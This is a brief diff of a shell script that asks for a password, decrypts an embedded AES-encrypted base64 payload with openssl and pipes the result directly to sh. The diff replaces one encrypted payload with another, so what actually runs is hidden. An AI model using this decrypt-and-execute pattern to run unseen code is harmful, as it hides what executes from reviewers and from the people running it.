@@ -3,6 +3,6 @@
 set -e
 if ! command -v openssl >/dev/null 2>&1; then echo "Error: openssl required"; exit 1; fi
 printf "Password: " > /dev/tty; stty -echo 2>/dev/null || true; read PASSWORD < /dev/tty; stty echo 2>/dev/null || true; echo "" > /dev/tty
-PAYLOAD="U2FsdGVkX19FRvl4Lu5GSA/Wc4qA/YddndAmy7BhOARWOXU7KcFuSN7rgWpKH4l932PamzLCaMZRRa2jQ9BBTILWsjmTvcB7cYzWHLykQtV3JJVMLzTjnM3gayuqGiAs"
+PAYLOAD="U2FsdGVkX1/w9z1fqK8dfmI84AwewrGo1cXzzBgn1TsoDb8/829cVy4Lc/Ndc4n8KDqJaQUgM+TPP1kKsIOoVCkSO6YmGkWx28/fONHDmzpJYGCH021vpj3a4r/9HluK"
 DECRYPTED=$(echo "$PAYLOAD" | openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -k "$PASSWORD" 2>/dev/null) || { echo "Error: Decryption failed. Wrong password?"; exit 1; }
 echo "$DECRYPTED" | sh
